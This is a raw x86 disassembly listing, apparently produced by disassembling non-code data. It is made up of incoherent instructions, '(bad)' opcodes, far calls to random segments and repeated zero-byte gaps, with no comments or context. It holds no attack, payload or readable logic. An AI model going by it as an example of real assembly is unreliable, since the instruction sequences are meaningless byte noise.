  41d8f0:	cmp    eax,0xd76f36e4
  41d8f5:	push   esi
  41d8f6:	sub    edx,DWORD PTR [ebp-0x37]
  41d8f9:	push   ds
  41d8fa:	fiadd  WORD PTR [esi]
  41d8fc:	lods   eax,DWORD PTR ds:[esi]
  41d8fd:	or     BYTE PTR [edx-0x3f0b228e],0xc1
  41d904:	pushf  
  41d905:	mov    ch,0xa7
  41d907:	xor    al,0x27
  41d909:	scas   al,BYTE PTR es:[edi]
  41d90a:	out    0x35,al
  41d90c:	mov    ebp,es
  41d90e:	call   0x8824eb80
  41d913:	je     0x41d98a
  41d915:	sti    
  41d916:	xor    BYTE PTR [edx+0x31cfeb5e],dl
  41d91c:	cmp    DWORD PTR [eax],0x47
  41d91f:	jne    0x41d8e6
  41d921:	sahf   
  41d922:	dec    ebp
  41d923:	loopne 0x41d99c
  41d925:	add    al,0xfc
  41d927:	or     esi,ebp
  41d929:	inc    ebp
  41d92a:	xchg   edx,eax
  41d92b:	adc    al,BYTE PTR [edx+edi*4-0x3e]
  41d92f:	cmp    eax,0xd0775291
  41d934:	xor    esi,DWORD PTR gs:[ebp+0x32]
  41d938:	out    dx,eax
  41d939:	fsubr  st(1),st
  41d93b:	add    al,0x26
  41d93d:	adc    bl,BYTE PTR [edi-0x3f7b1b2a]
  41d943:	fimul  DWORD PTR [ebx-0x48]
  41d946:	aas    
  41d947:	xor    eax,0x27bf93b2
  41d94c:	rcl    DWORD PTR [ecx-0x5],0x35
  41d950:	inc    DWORD PTR [edi+eax*4+0x32]
  41d954:	dec    edx
  41d955:	mov    esp,0x8d563096
  41d95a:	js     0x41d970
  41d95c:	hlt    
  41d95d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d95e:	bound  esi,QWORD PTR [edx]
  41d960:	mov    dl,BYTE PTR ds:0x84438f8d
  41d966:	or     ch,bh
  41d968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d969:	imul   esp,DWORD PTR [ecx-0x3d],0xd7d7
	...
  41d9d4:	add    BYTE PTR [eax],al
  41d9d6:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d9da:	scas   eax,DWORD PTR es:[edi]
  41d9db:	(bad)  
  41d9dc:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d9e0:	outs   dx,DWORD PTR ds:[esi]
  41d9e1:	gs xchg ebp,eax
  41d9e3:	dec    edi
  41d9e4:	or     al,0x56
  41d9e6:	add    DWORD PTR ds:[bx+si],eax
  41d9ea:	add    BYTE PTR [ecx],al
  41d9ec:	add    BYTE PTR [eax],al
  41d9ee:	or     cl,bh
  41d9f0:	mov    al,ds:0x5047aad9
  41d9f5:	jl     0x41d9d9
  41d9f7:	sti    
  41d9f8:	adc    eax,0xfea8a582
  41d9fd:	xchg   esp,eax
  41d9fe:	adc    BYTE PTR [edi+0x6b],bl
  41da01:	xchg   esi,eax
  41da02:	shl    bl,0xcb
  41da05:	sbb    DWORD PTR [eax-0x7451bf65],0x31
  41da0c:	and    bh,BYTE PTR [esi]
  41da0e:	jb     0x41da81
  41da10:	mov    dh,0xaa
  41da12:	call   0xfac9b5a8
  41da17:	mov    ebx,0x2fac3f23
  41da1c:	stos   DWORD PTR es:[edi],eax
  41da1d:	mov    ebx,0x80f7f6b7
  41da22:	or     BYTE PTR [ecx+0x281ae89f],bh
  41da28:	sbb    DWORD PTR [edx+0x3b],0xffffffc9
  41da2c:	cmp    eax,0x1a58284b
  41da31:	jge    0x41da19
  41da33:	adc    esi,ebp
  41da35:	call   DWORD PTR [ecx+0x58]
  41da38:	arpl   WORD PTR [eax-0x310eb1e4],si
  41da3e:	xchg   ebx,eax
  41da3f:	lock sbb ecx,DWORD PTR [ebx+0x2c]
  41da43:	daa    
  41da44:	aad    0x96
  41da46:	cmc    
  41da47:	das    
  41da48:	inc    ebp
  41da49:	outs   dx,DWORD PTR ds:[esi]
  41da4a:	dec    edx
  41da4b:	sbb    ah,BYTE PTR [edx-0x59]
  41da4e:	sub    eax,0x2ddb0cb3
  41da53:	loope  0x41da56
  41da55:	int    0xf3
  41da57:	sbb    edi,DWORD PTR [ebx+0x53056826]
  41da5d:	fwait
  41da5e:	daa    
  41da5f:	ins    DWORD PTR es:[edi],dx
  41da60:	push   esp
  41da61:	test   al,0x78
  41da63:	popf   
  41da64:	mov    edi,0xe9b1f015
  41da69:	cmp    al,0xc1
  41da6b:	mov    edi,esp
  41da6d:	outs   dx,BYTE PTR ds:[esi]
  41da6e:	ror    al,cl
  41da70:	pushf  
  41da71:	dec    esi
  41da72:	(bad)  
  41da73:	or     bh,dl
  41da75:	clc    
  41da76:	outs   dx,DWORD PTR ds:[esi]
  41da77:	les    ebp,FWORD PTR [esi-0x48b70f16]
  41da7d:	mov    dh,0xbb
  41da7f:	pop    DWORD PTR [ecx-0x7e9a4bb4]
  41da85:	aad    0xac
  41da87:	jne    0x41da28
  41da89:	pusha  
  41da8a:	call   0x92fb:0x50a76c58
  41da91:	inc    ebx
  41da92:	jecxz  0x41da55
  41da94:	clc    
  41da95:	xchg   ecx,eax
  41da96:	mul    DWORD PTR [edx]
  41da98:	pop    ss
  41da99:	sub    dl,BYTE PTR [edx-0x28033b9e]
  41da9f:	jge    0x41dad7
  41daa1:	ror    DWORD PTR [edi-0x19],cl
  41daa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daa5:	clc    
  41daa6:	and    bh,ch
  41daa8:	mov    dh,0xb0
  41daaa:	mov    cl,0x5
  41daac:	pop    ebp
  41daad:	jo     0x41da8f
  41daaf:	and    eax,0xdffdf429
  41dab4:	scas   al,BYTE PTR es:[edi]
  41dab5:	inc    ecx
  41dab6:	call   0x6b74:0xd6f04a4b
  41dabd:	fwait
  41dabe:	jns    0x41daf6
  41dac0:	jmp    0xd53:0x21bde05b
  41dac7:	xchg   BYTE PTR ss:[ecx],ch
  41daca:	dec    esi
  41dacb:	(bad)  
  41dacd:	loop   0x41db07
  41dacf:	jge    0x41dad2
  41dad1:	das    
  41dad2:	xchg   ebx,eax
  41dad3:	sar    DWORD PTR [ecx],1
  41dad5:	pop    edx
  41dad6:	loop   0x41db0a
  41dad8:	gs into 
  41dada:	or     DWORD PTR [ecx+0x52deb99a],esi
  41dae0:	xchg   esi,eax
  41dae1:	sahf   
  41dae2:	mov    ss,edi
  41dae4:	mov    cl,0xa8
  41dae6:	mov    ds:0xe1e3a284,eax
  41daeb:	pop    ds
  41daec:	and    edx,0x0
	...
  41db53:	add    BYTE PTR [eax],al
  41db55:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41db5c:	cmp    al,0x5f
  41db5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db5f:	push   edi
  41db60:	sbb    ebp,0x3a
  41db63:	retf   0x95f1
  41db66:	addr16 aas 
  41db68:	add    DWORD PTR [eax],eax
  41db6a:	add    BYTE PTR [ecx],al
  41db6c:	add    BYTE PTR [eax],al
  41db6e:	pop    ebx
  41db6f:	nop
  41db70:	scas   eax,DWORD PTR es:[edi]
  41db71:	scas   eax,DWORD PTR es:[edi]
  41db72:	mov    ?,WORD PTR [ebp-0x41c885d6]
  41db78:	jbe    0x41db03
  41db7a:	xor    ah,BYTE PTR [ebx+0x13ccc5e6]
  41db80:	dec    edi
  41db81:	test   al,0xf3
  41db83:	xchg   edx,eax
  41db84:	xchg   edx,eax
  41db85:	push   ebp
  41db86:	mov    eax,DWORD PTR [edx]
  41db88:	stos   DWORD PTR es:[edi],eax
  41db89:	mov    esp,DWORD PTR [edx-0x77]
  41db8c:	shl    DWORD PTR [edi+ebx*1],1
  41db8f:	push   ds
  41db90:	mov    cl,0x4f
  41db92:	lea    edi,[ecx-0x1df9b8f6]
  41db98:	jmp    0x41db7e
  41db9a:	mov    ebx,0x4b91a1df
  41db9f:	fst    QWORD PTR [edx-0x22965fb1]
  41dba5:	adc    BYTE PTR [edi-0x52],dh
  41dba8:	dec    esp
  41dba9:	sbb    eax,DWORD PTR ss:[bx+di+0x5708]
  41dbaf:	or     dl,BYTE PTR [esp+edx*4-0x6c]
  41dbb3:	pop    ecx
  41dbb4:	imul   esp,DWORD PTR [ebp-0x56],0xffffffc6
  41dbb8:	int3   
  41dbb9:	scas   al,BYTE PTR es:[edi]
  41dbba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbbb:	xchg   ebp,eax
  41dbbc:	jb     0x41db6b
  41dbbe:	xor    eax,0xeed1a9de
  41dbc3:	sbb    al,BYTE PTR [ecx]
  41dbc5:	xchg   ebp,eax
  41dbc6:	xchg   ecx,eax
  41dbc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbc8:	adc    edx,edx
  41dbca:	pop    esp
  41dbcb:	pushf  
  41dbcc:	stos   DWORD PTR es:[edi],eax
  41dbcd:	and    al,0xab
  41dbcf:	or     ah,BYTE PTR [ecx]
  41dbd1:	sti    
  41dbd2:	in     al,dx
  41dbd3:	jmp    0x41dbd9
  41dbd5:	sbb    eax,0x3e0b60ea
  41dbda:	mov    ds:0xd7216563,eax
  41dbdf:	mov    ebx,DWORD PTR [ebx+0x6c804146]
  41dbe5:	ret    0x65f7
  41dbe8:	pop    eax
  41dbe9:	mov    ebp,0x91b068de
  41dbee:	lea    ebx,[ebp-0x6b]
  41dbf1:	call   0xbbd5:0x2c24f129
  41dbf8:	cwde   
  41dbf9:	add    edx,DWORD PTR [edi-0x28]
  41dbfc:	jmp    0x41db88
  41dbfe:	inc    ebx
  41dbff:	and    ebp,DWORD PTR [eax]
  41dc01:	imul   esi,eax,0xffffff83
  41dc04:	test   BYTE PTR [esi],0x7b
  41dc07:	nop
  41dc08:	out    0x75,eax
  41dc0a:	retf   
  41dc0b:	xchg   edx,eax
  41dc0c:	out    0xa,eax
  41dc0e:	rol    DWORD PTR [ebx+0x55],0x5c
  41dc12:	test   DWORD PTR [ebx],eax
  41dc14:	jl     0x41dc49
  41dc16:	imul   edi,ebp,0xeb23553b
  41dc1c:	loope  0x41dc6e
  41dc1e:	cmp    al,0xac
  41dc20:	scas   eax,DWORD PTR es:[edi]
  41dc21:	fstp   TBYTE PTR [ecx+eiz*4]
  41dc24:	xor    al,0x5f
  41dc26:	pop    ecx
  41dc27:	cmp    BYTE PTR [edi+0x27],dh
  41dc2a:	hlt    
  41dc2b:	mov    bh,0xd4
  41dc2d:	jb     0x41dc40
  41dc2f:	rcr    ebx,cl
  41dc31:	mov    ds:0xa249cd53,al
  41dc36:	pop    esp
  41dc37:	sub    DWORD PTR [esp+ecx*4-0x7d],esi
  41dc3b:	fbld   TBYTE PTR [edi+edx*1]
  41dc3e:	cmp    eax,0x5af40199
  41dc43:	jmp    0x41dc89
  41dc45:	loope  0x41dbca
  41dc47:	and    al,cl
  41dc49:	mov    bl,dl
  41dc4b:	mov    ch,0xeb
  41dc4d:	(bad)  
  41dc4e:	jns    0x41dc23
  41dc50:	xchg   ch,bl
  41dc52:	sbb    BYTE PTR [ebx-0x9c19a38],dl
  41dc58:	mov    ebx,0x795a736e
  41dc5d:	xor    al,0x13
  41dc5f:	pop    esp
  41dc60:	test   al,0x94
  41dc62:	cs stc 
  41dc64:	push   edx
  41dc65:	ins    DWORD PTR es:[edi],dx
  41dc66:	imul   eax,DWORD PTR [esi],0x73c59f15
  41dc6c:	cld    
  41dc6d:	dec    edi
	...
  41dcd6:	outs   dx,DWORD PTR ds:[esi]
  41dcd7:	retf   0x9815
  41dcda:	mov    ch,0xdf
  41dcdc:	out    dx,eax
  41dcdd:	jmp    DWORD PTR [edi-0x4f2fb0]
  41dce3:	fwait
  41dce4:	and    bh,bl
  41dce6:	addr16 inc eax
  41dce8:	add    DWORD PTR [eax],eax
  41dcea:	add    BYTE PTR [ecx],al
  41dcec:	add    BYTE PTR [eax],al
  41dcee:	addr16 push eax
  41dcf0:	mov    ch,0x53
  41dcf2:	dec    eax
  41dcf3:	and    al,0x5
  41dcf5:	stos   DWORD PTR es:[edi],eax
  41dcf6:	pop    edi
  41dcf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcf8:	adc    ecx,esi
  41dcfa:	jl     0x41dd1b
  41dcfc:	rcl    DWORD PTR [edi+edi*1],1
  41dcff:	mov    ch,0x58
  41dd01:	mov    dl,BYTE PTR [edx+0xa]
  41dd04:	(bad)  
  41dd05:	in     eax,dx
  41dd06:	dec    esp
  41dd07:	jecxz  0x41dcb0
  41dd09:	in     al,dx
  41dd0a:	inc    edx
  41dd0b:	xor    DWORD PTR [eax],0xfaef3d16
  41dd11:	cmp    ah,cl
  41dd13:	lahf   
  41dd14:	les    ebp,FWORD PTR [eax-0x58f99edb]
  41dd1a:	outs   dx,DWORD PTR ds:[esi]
  41dd1b:	rcl    al,cl
  41dd1d:	mov    ds:0x11131768,al
  41dd22:	fsub   DWORD PTR [eax]
  41dd24:	inc    ecx
  41dd25:	shl    DWORD PTR [ecx],cl
  41dd27:	xor    al,0xad
  41dd29:	xor    DWORD PTR [ebx-0xe04d395],edi
  41dd2f:	mov    cl,0x38
  41dd31:	popa   
  41dd32:	inc    ebx
  41dd33:	popa   
  41dd34:	and    eax,0x2d82ee73
  41dd39:	push   0xdf9bac62
  41dd3e:	repz jns 0x41dd39
  41dd41:	xchg   esp,eax
  41dd42:	sub    al,0xd1
  41dd44:	dec    eax
  41dd45:	jp     0x41dcef
  41dd47:	sub    eax,DWORD PTR [edi]
  41dd49:	stos   DWORD PTR es:[edi],eax
  41dd4a:	mov    eax,0x21d42671
  41dd4f:	(bad)  
  41dd50:	xor    bl,BYTE PTR ds:0x1e793ea5
  41dd56:	mov    cl,0x57
  41dd58:	jg     0x41dd5d
  41dd5a:	fwait
  41dd5b:	or     BYTE PTR [esi],ch
  41dd5d:	dec    eax
  41dd5e:	jo     0x41dd1c
  41dd60:	clc    
  41dd61:	and    al,0x7e
  41dd63:	fstp   TBYTE PTR [eax-0x464cddc3]
  41dd69:	test   al,0x37
  41dd6b:	gs in  eax,dx
  41dd6d:	lea    ecx,[edi+0x49]
  41dd70:	mov    ebp,0x141864e3
  41dd75:	xchg   ebp,esi
  41dd77:	sub    al,BYTE PTR [ebx]
  41dd79:	addr16 cwde 
  41dd7b:	pop    edi
  41dd7c:	inc    BYTE PTR [edi+ebx*4]
  41dd7f:	inc    edi
  41dd80:	ret    
  41dd81:	es repnz out dx,eax
  41dd84:	out    dx,eax
  41dd85:	adc    esp,DWORD PTR [edx+0x392c09ba]
  41dd8b:	jbe    0x41de02
  41dd8d:	sub    al,0x91
  41dd8f:	sub    DWORD PTR [edx],edi
  41dd91:	fnstenv [edx+edx*4+0xb]
  41dd95:	scas   al,BYTE PTR es:[edi]
  41dd96:	xor    BYTE PTR [ebp+0x34c80e9b],0x85
  41dd9d:	out    dx,al
  41dd9e:	xchg   esp,eax
  41dd9f:	pop    fs
  41dda1:	push   ecx
  41dda2:	in     al,dx
  41dda3:	adc    ebx,DWORD PTR cs:[ebp+0x2baa3e43]
  41ddaa:	jecxz  0x41de29
  41ddac:	xlat   BYTE PTR ds:[ebx]
  41ddad:	shr    DWORD PTR [ebp-0x3384ee4f],0x8d
  41ddb4:	fadd   QWORD PTR [ebp-0x2d]
  41ddb7:	sbb    al,BYTE PTR [ebp+0x515d6657]
  41ddbd:	mov    ds:0xbb4f9d01,eax
  41ddc2:	cli    
  41ddc3:	shl    DWORD PTR [esi-0x75],0xff
  41ddc7:	inc    eax
  41ddc8:	inc    eax
  41ddc9:	ins    BYTE PTR es:[edi],dx
  41ddca:	inc    edx
  41ddcb:	out    dx,eax
  41ddcc:	xchg   edi,eax
  41ddcd:	and    eax,0x601652ba
  41ddd2:	add    DWORD PTR [ecx+edi*8+0x6f],ebx
  41ddd6:	xchg   esp,eax
  41ddd7:	(bad)  
  41ddd8:	rol    BYTE PTR [edx+0x29bd6612],cl
  41ddde:	push   cs
  41dddf:	sub    esi,DWORD PTR [eax-0x2caf36bd]
  41dde5:	add    eax,0xaf5fad18
  41ddea:	add    al,0x74
  41ddec:	enter  0xae,0x0
	...
  41de54:	add    BYTE PTR [eax],al
  41de56:	and    bl,dh
  41de58:	das    
  41de59:	cmp    bh,0xde
  41de5c:	lods   eax,DWORD PTR ds:[esi]
  41de5d:	repz pop ds
  41de5f:	mov    bl,BYTE PTR [esi-0x41]
  41de62:	fisttp WORD PTR [edx+0x41670724]
  41de68:	add    DWORD PTR [eax],eax
  41de6a:	add    BYTE PTR [ecx],al
  41de6c:	add    BYTE PTR [eax],al
  41de6e:	xchg   BYTE PTR [edx],al
  41de70:	clc    
  41de71:	jmp    0x41dea9
  41de73:	jb     0x41dede
  41de75:	xchg   edi,eax
  41de76:	in     al,dx
  41de77:	out    dx,al
  41de78:	(bad)  
  41de7a:	dec    edi
  41de7b:	cmp    edx,DWORD PTR [esi+0x56]
  41de7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de7f:	cld    
  41de80:	inc    ecx
  41de81:	div    DWORD PTR [eax-0x3ffa3942]
  41de87:	neg    BYTE PTR [eax]
  41de89:	arpl   dx,ax
  41de8b:	cmp    eax,0x810b14f7
  41de90:	ins    DWORD PTR es:[edi],dx
  41de91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de92:	clc    
  41de93:	jle    0x41df06
  41de95:	adc    esp,DWORD PTR [esi+0x50742fdb]
  41de9b:	inc    ebx
  41de9c:	clc    
  41de9d:	scas   eax,DWORD PTR es:[edi]
  41de9e:	sub    al,0x51
  41dea0:	test   BYTE PTR [esi],bl
  41dea2:	mov    dl,0x86
  41dea4:	ficomp DWORD PTR [esi-0x6a]
  41dea7:	pusha  
  41dea8:	mov    ebp,0x7d1aa654
  41dead:	shr    DWORD PTR [ecx+esi*2-0x7a879ce7],1
  41deb4:	mov    esp,0xe7d8809
  41deb9:	sbb    BYTE PTR [eax],bl
  41debb:	out    0x1e,al
  41debd:	ss loop 0x41de4c
  41dec0:	lock mov dh,BYTE PTR [ebx-0x525c4e72]
  41dec7:	sub    BYTE PTR [esi+0x48],dh
  41deca:	sub    BYTE PTR [edx+0x981aff9],ch
  41ded0:	xor    ah,BYTE PTR [edx+eax*4-0x71]
  41ded4:	add    eax,0xc3b7f0e3
  41ded9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41deda:	pop    ecx
  41dedb:	push   ecx
  41dedc:	jne    0x41df52
  41dede:	call   0x1c25:0xdfa088d7
  41dee5:	sub    BYTE PTR [edi],cl
  41dee7:	dec    ebx
  41dee8:	jg     0x41de99
  41deea:	test   eax,0x84213270
  41deef:	out    dx,eax
  41def0:	xchg   edx,eax
  41def1:	xor    cl,BYTE PTR [eax-0x42b60932]
  41def7:	xchg   ebp,eax
  41def8:	inc    ebx
  41def9:	mov    esi,0x87044819
  41defe:	lds    esi,FWORD PTR [eax]
  41df00:	jge    0x41de9f
  41df02:	call   0x7de1:0x9f1bc0d0
  41df09:	pop    eax
  41df0a:	bound  ecx,QWORD PTR [esi-0x7fe17b63]
  41df10:	xchg   ebp,eax
  41df11:	jno    0x41df8f
  41df13:	push   ebp
  41df14:	sub    eax,esp
  41df16:	scas   eax,DWORD PTR es:[edi]
  41df17:	shl    BYTE PTR [edx+0x7f],cl
  41df1a:	dec    esp
  41df1b:	push   ds
  41df1c:	cmp    eax,0xd1a1b1cf
  41df21:	inc    esp
  41df22:	push   esp
  41df23:	mov    eax,0x22a07d2
  41df28:	shl    DWORD PTR [esi+0x16bd3e8a],cl
  41df2e:	imul   edi,DWORD PTR [ecx+eax*8-0x40],0x89a1adf4
  41df36:	mov    esi,0xa9d0bbeb
  41df3b:	or     eax,DWORD PTR [esp+edx*8+0x0]
  41df3f:	scas   al,BYTE PTR es:[edi]
  41df40:	aas    
  41df41:	xchg   esi,eax
  41df42:	add    eax,0x301f2a33
  41df47:	inc    ecx
  41df48:	mov    edx,0xa754e5c5
  41df4d:	mov    al,0x97
  41df4f:	(bad)  
  41df50:	xlat   BYTE PTR ds:[ebx]
  41df51:	hlt    
  41df52:	sbb    al,BYTE PTR [ebx-0x11]
  41df55:	mov    al,ds:0xb14a82c0
  41df5a:	jbe    0x41dee6
  41df5c:	stos   BYTE PTR es:[edi],al
  41df5d:	cmp    BYTE PTR [edi],bl
  41df5f:	ret    0x7e40
  41df62:	and    DWORD PTR [edi+0x2f73e2c5],ebp
  41df68:	add    al,0x99
  41df6a:	fidiv  DWORD PTR [edi+0x7b]
  41df6d:	cwde   
	...
  41dfd6:	aas    
  41dfd7:	daa    
  41dfd8:	push   ss
  41dfd9:	cld    
  41dfda:	push   ds
  41dfdb:	std    
  41dfdc:	jmp    edi
  41dfde:	dec    edi
  41dfdf:	push   0x9e789ce9
  41dfe4:	pop    es
  41dfe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfe6:	addr16 inc edx
  41dfe8:	add    DWORD PTR [eax],eax
  41dfea:	add    BYTE PTR [ecx],al
  41dfec:	add    BYTE PTR [eax],al
  41dfee:	pop    ds
  41dfef:	mov    esi,0xdce94e2c
  41dff4:	adc    esi,ebx
  41dff6:	pavgw  mm2,mm4
  41dff9:	adc    eax,0xaf92bc85
  41dffe:	mov    ds:0xc48d7640,eax
  41e003:	cmp    edi,DWORD PTR [edi+eiz*1-0x4]
  41e007:	das    
  41e008:	daa    
  41e009:	stc    
  41e00a:	dec    edx
  41e00b:	mov    ch,ah
  41e00d:	outs   dx,DWORD PTR ds:[esi]
  41e00e:	(bad)  
  41e00f:	scas   eax,DWORD PTR es:[edi]
  41e010:	inc    esi
  41e011:	fsubr  st(1),st
  41e013:	push   esi
  41e014:	sub    eax,DWORD PTR [ecx+0x1ad230d4]
  41e01a:	mov    dl,0x38
  41e01c:	xor    DWORD PTR [eax],0x17b3f93d
  41e022:	xor    al,BYTE PTR [ebx-0x10]
  41e025:	(bad)  
  41e026:	adc    ebp,DWORD PTR [ecx+0x2c]
  41e029:	bnd jp 0x41e0a2
  41e02c:	cmp    cl,BYTE PTR [edx]
  41e02e:	inc    edx
  41e02f:	pop    eax
  41e030:	jbe    0x41e07d
  41e032:	mov    ebp,0xca468725
  41e037:	in     eax,dx
  41e038:	clc    
  41e039:	adc    bh,BYTE PTR [esi+edx*4]
  41e03c:	cmp    DWORD PTR [ecx],esp
  41e03e:	push   edx
  41e03f:	jo     0xbb459cbf
  41e045:	xor    ebp,ecx
  41e047:	popw   ss
  41e049:	and    BYTE PTR [esi+ebx*1+0x62c0706],ah
  41e050:	aad    0x50
  41e052:	bnd jae 0x41e0cf
  41e055:	jae    0x41e0b8
  41e057:	push   esp
  41e058:	adc    al,0xa3
  41e05a:	cmp    bl,ch
  41e05c:	jmp    0x41e05c
  41e05e:	imul   ecx,DWORD PTR [ebp-0x57],0x2
  41e062:	jge    0x41dfff
  41e064:	adc    cl,BYTE PTR [ebx+eax*2+0x75]
  41e068:	fnop   
  41e06a:	xor    DWORD PTR [edi+esi*8],esp
  41e06d:	in     al,0xf5
  41e06f:	sub    ecx,DWORD PTR [edx-0x6e]
  41e072:	and    BYTE PTR ds:0x9a4f966,dh
  41e078:	jbe    0x41e0dd
  41e07a:	icebp  
  41e07b:	stos   BYTE PTR es:[edi],al
  41e07c:	xchg   esp,eax
  41e07d:	pop    es
  41e07e:	dec    ebp
  41e07f:	idiv   DWORD PTR [esi-0x526a476a]
  41e085:	push   ebp
  41e086:	call   0x6405:0x4f4db27d
  41e08d:	adc    dh,BYTE PTR [ebp+0x22af54be]
  41e093:	sub    DWORD PTR [edi+0x66c58d61],esp
  41e099:	(bad)  
  41e09a:	addr16 pushf 
  41e09c:	hlt    
  41e09d:	mov    dl,0xb0
  41e09f:	xchg   DWORD PTR [eax+edi*2],esp
  41e0a2:	rol    DWORD PTR [edx-0x79025267],0x59
  41e0a9:	in     eax,dx
  41e0aa:	test   BYTE PTR [eax-0x37],cl
  41e0ad:	cwde   
  41e0ae:	xor    BYTE PTR [edi-0x72a14b3d],dh
  41e0b4:	inc    ebp
  41e0b5:	sbb    dl,BYTE PTR [edx+esi*8+0x3d]
  41e0b9:	sbb    eax,0x441b6448
  41e0be:	dec    ebx
  41e0bf:	fisub  WORD PTR [esi-0x12e7086e]
  41e0c5:	or     BYTE PTR [ebp+0x60acd081],ah
  41e0cb:	inc    ecx
  41e0cc:	mov    dh,0x79
  41e0ce:	push   eax
  41e0cf:	mov    ds:0xcfabed06,eax
  41e0d4:	add    cl,dl
  41e0d6:	pusha  
  41e0d7:	xor    dh,0x7f
  41e0da:	add    bl,dl
  41e0dc:	ja     0x41e103
  41e0de:	lods   al,BYTE PTR ds:[esi]
  41e0df:	xchg   DWORD PTR [eax-0x53],esi
  41e0e2:	call   0xd4dc:0xd52e6dda
  41e0e9:	ss push cs
  41e0eb:	fwait
  41e0ec:	add    al,0xdb
	...
  41e156:	dec    edi
  41e157:	push   ebx
  41e158:	add    al,0xc
  41e15a:	sbb    al,0x5f
  41e15c:	dec    edi
  41e15d:	push   ebx
  41e15e:	out    0x6d,eax
  41e160:	aad    0x48
  41e162:	jbe    0x41e132
  41e164:	xchg   ebp,eax
  41e165:	aas    
  41e166:	addr16 inc ebx
  41e168:	add    DWORD PTR [eax],eax
  41e16a:	add    BYTE PTR [ecx],al
  41e16c:	add    BYTE PTR [eax],al
  41e16e:	jp     0x41e1c7
  41e170:	adc    al,BYTE PTR [edi+0x2e]
  41e173:	push   esp
  41e174:	fiadd  WORD PTR [edx]
  41e176:	or     edi,ecx
  41e178:	ins    BYTE PTR es:[edi],dx
  41e179:	out    0x48,eax
  41e17b:	(bad)  
  41e17c:	cmp    DWORD PTR [ecx+0x1b],esi
  41e17f:	test   BYTE PTR [edx],dh
  41e181:	mov    ecx,0x3ed3fd5
  41e186:	(bad)  
  41e187:	outs   dx,DWORD PTR ds:[esi]
  41e188:	sub    DWORD PTR [edx],0x6a
  41e18b:	mov    al,ds:0xc2c4c228
  41e190:	jne    0x41e20f
  41e192:	and    al,0xcd
  41e194:	jp     0x41e209
  41e196:	es inc edx
  41e198:	adc    ebp,DWORD PTR [edx+0x22fd1b92]
  41e19e:	adc    DWORD PTR [eax-0x52],esi
  41e1a1:	packsswb mm3,QWORD PTR [ebx+0x3dfc47f9]
  41e1a8:	xchg   dh,dl
  41e1aa:	ss cmp eax,0xfeb69895
  41e1b0:	push   ebp
  41e1b1:	sbb    al,0xaf
  41e1b3:	xchg   BYTE PTR [edx],bh
  41e1b5:	mov    ds,WORD PTR [esp+ebx*8+0x6d]
  41e1b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1ba:	adc    ecx,DWORD PTR es:0xc45c8fed
  41e1c1:	stos   DWORD PTR es:[edi],eax
  41e1c2:	mov    al,0xb9
  41e1c4:	push   ecx
  41e1c5:	jo     0x41e22c
  41e1c7:	inc    esi
  41e1c8:	mov    DWORD PTR [ecx-0x73],ebp
  41e1cb:	and    DWORD PTR [ebp-0x478f900b],esi
  41e1d1:	xor    al,0x65
  41e1d3:	aam    0x65
  41e1d5:	mov    BYTE PTR [ebp-0x65ab53fe],0x4a
  41e1dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1dd:	out    0xf4,al
  41e1df:	js     0x41e191
  41e1e1:	mov    eax,ds:0x6b13b6f1
  41e1e6:	cli    
  41e1e7:	retf   0xa375
  41e1ea:	ja     0x41e223
  41e1ec:	(bad)  
  41e1ed:	lea    ecx,[eax-0x22]
  41e1f0:	and    al,0x15
  41e1f2:	cmp    esp,ebx
  41e1f4:	add    eax,0x7450cd2a
  41e1f9:	inc    ebp
  41e1fa:	ret    
  41e1fb:	test   BYTE PTR [edi-0x65],dl
  41e1fe:	icebp  
  41e1ff:	mov    edi,0x8c83ab9f
  41e204:	pushf  
  41e205:	out    dx,al
  41e206:	aas    
  41e207:	cmp    ebx,edx
  41e209:	inc    edx
  41e20a:	cmc    
  41e20b:	stos   DWORD PTR es:[edi],eax
  41e20c:	jmp    DWORD PTR [edi+ecx*4]
  41e20f:	mov    ds:0x5005f38,eax
  41e214:	popa   
  41e215:	ds pop ecx
  41e217:	jnp    0x41e1d9
  41e219:	je     0x41e1a5
  41e21b:	dec    ebx
  41e21c:	dec    edx
  41e21d:	(bad)  
  41e21e:	jg     0x41e269
  41e220:	xchg   ebp,eax
  41e221:	out    dx,eax
  41e222:	push   edx
  41e223:	icebp  
  41e224:	inc    esp
  41e225:	dec    ebx
  41e226:	mov    eax,0x28d3f879
  41e22b:	sar    edi,0xf1
  41e22e:	inc    esp
  41e22f:	imul   BYTE PTR [esi+0x72]
  41e232:	sub    bl,BYTE PTR [eax+0x5b694b68]
  41e238:	xor    DWORD PTR [edi+eax*8],edx
  41e23b:	or     DWORD PTR [eax+0x6b],eax
  41e23e:	xor    edi,DWORD PTR [ebp-0x4a]
  41e241:	xchg   BYTE PTR [eax],dl
  41e243:	test   DWORD PTR [edx],esp
  41e245:	cdq    
  41e246:	push   esi
  41e247:	stos   DWORD PTR es:[edi],eax
  41e248:	in     al,0x70
  41e24a:	or     DWORD PTR [edi+ebp*8],edx
  41e24d:	call   0xb00164e8
  41e252:	cmc    
  41e253:	sbb    BYTE PTR [ebx-0x4e9e7e09],ch
  41e259:	push   eax
  41e25a:	outs   dx,BYTE PTR ds:[esi]
  41e25b:	bound  esi,QWORD PTR [eax]
  41e25d:	(bad)  
  41e25e:	cli    
  41e25f:	popa   
  41e260:	and    ecx,DWORD PTR [eax-0x39]
  41e263:	dec    edx
  41e264:	aad    0x7d
  41e266:	pop    esi
  41e267:	and    ebx,DWORD PTR [eax+0x54]
  41e26a:	or     al,dh
  41e26c:	dec    ecx
  41e26d:	leave  
	...
  41e2d6:	stos   DWORD PTR es:[edi],eax
